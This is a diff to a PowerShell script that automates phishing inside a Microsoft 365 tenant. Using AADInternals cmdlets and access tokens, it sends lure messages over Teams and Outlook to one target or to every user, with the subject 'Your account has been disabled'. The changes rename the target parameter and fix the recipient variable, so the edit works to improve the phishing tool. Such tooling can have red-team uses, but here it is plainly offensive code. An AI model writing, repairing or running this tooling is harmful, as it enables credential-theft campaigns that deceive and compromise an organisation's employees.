@@ -1,7 +1,7 @@
 [CmdletBinding()]
 param (
     [Parameter(ValueFromPipelineByPropertyName=$true)]
-    [string]$teamsUser,
+    [string]$targetUser,
     [Parameter(ValueFromPipelineByPropertyName=$true)]
     [string]$messageContent,
     [Parameter(ValueFromPipelineByPropertyName=$true)]
@@ -235,8 +235,8 @@ function Send-TeamsMessageWithRetry {
 }
 
 ### Conditional logic for Sending Messages
-if ($teamsUser) {
-    if ($teamsUser -eq "all") {
+if ($targetUser) {
+    if ($targetUser -eq "all") {
         foreach ($user in $users) {
             Read-Host "Warning: This will will attempt to send your phishing message to every user in the tenant. Do you want to continue?"
             Write-Output "You like to party."
@@ -250,10 +250,10 @@ if ($teamsUser) {
     } else {
         Write-Output "Setting user status message to 'Gone Phishin'"
         Set-AADIntTeamsStatusMessage -Message "Gone Phishin'" -AccessToken $MSTeamsToken.access_token -Verbose
-        # Send-TeamsMessageWithRetry -Recipient $teamsUser -Message $teamsMessage
-        $mailuser = $teamsUser
+        # Send-TeamsMessageWithRetry -Recipient $targetUser -Message $teamsMessage
+        $mailuser = $targetUser
         $subject = "Your account has been disabled"
-        Send-AADIntOutlookMessage -AccessToken $At.access_token -Recipient $user -Subject $subject -Message $teamsMessage
+        Send-AADIntOutlookMessage -AccessToken $At.access_token -Recipient $mailUser -Subject $subject -Message $teamsMessage
     }
 } else {
     Write-Host "No Teams user specified. Skipping message sending."
